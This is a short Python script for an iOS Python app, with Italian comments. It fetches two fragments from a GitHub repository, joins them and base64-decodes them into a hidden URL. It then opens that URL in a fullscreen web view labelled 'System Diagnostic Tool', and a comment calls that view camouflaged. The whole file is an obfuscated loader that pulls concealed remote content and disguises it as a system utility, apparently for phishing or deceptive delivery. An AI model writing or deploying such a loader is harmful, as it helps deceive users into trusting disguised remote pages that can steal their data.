import requests
import base64
import ui
import time

def brain():
    # URL puntati ai tuoi file reali su GitHub
    # Nota: ho usato il nome del branch 'principale' come si vede nelle tue foto
    BASE = "https://raw.githubusercontent.com/christianniederhauser906-ship-it/TikTok/principale/"
    
    try:
        # Recupero i pezzi (parte1.py e part2_1.py)
        p1 = requests.get(BASE + "parte1.py").text.strip()
        p2 = requests.get(BASE + "part2_1.py").text.strip()
        
        # Ora base64 è definito, quindi non darà più errore
        full_encoded = p1 + p2
        url = base64.b64decode(full_encoded).decode('utf-8', errors='ignore')
        
        # Lancio della WebView mimetica
        v = ui.WebView()
        v.name = "System Diagnostic Tool"
        v.load_url(url)
        v.present('fullscreen')
        
    except Exception as e:
        print(f"Errore durante l'assemblaggio: {e}")

if __name__ == "__main__":
    brain()
